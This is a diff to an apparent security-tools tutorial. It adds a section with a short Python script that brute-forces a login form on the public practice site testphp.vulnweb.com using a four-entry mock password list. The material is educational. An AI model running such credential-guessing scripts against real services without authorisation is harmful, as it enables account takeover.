@@ -113,6 +113,43 @@ python3 httptool.py
 > and URL-encodes anything in `params=` — so you rarely need to escape data by
 > hand the way you do with `curl`.
 
+## Tool 2c — A basic brute-force script
+
+Python is great for automating repetitive credential checks with `requests` if tools like Hydra aren't available or if you need to handle custom site logic. Create `brute.py`:
+
+```python
+import requests
+
+url = "http://testphp.vulnweb.com/login.php"
+username = "test"
+passwords = ["12345", "password", "test", "admin"] # small mockup wordlist
+
+print(f"Attempting login for user '{username}'...")
+
+for password in passwords:
+    data = {
+        "uname": username,
+        "pass": password
+    }
+
+    # Send a POST request to login endpoint
+    response = requests.post(url, data=data, timeout=5)
+
+    # If the response doesn't say incorrect, or reflects success, we found it
+    # Testphp sends back different content on success, we check for missing "Error"
+    if "Error:" not in response.text and "login failed" not in response.text.lower():
+        print(f"[+] Success! Password is: {password}")
+        break
+    else:
+        print(f"[-] Failed: {password}")
+```
+
+Run it:
+
+```bash
+python3 brute.py
+```
+
 ## Make it pretty with rich (optional)
 
 ```python
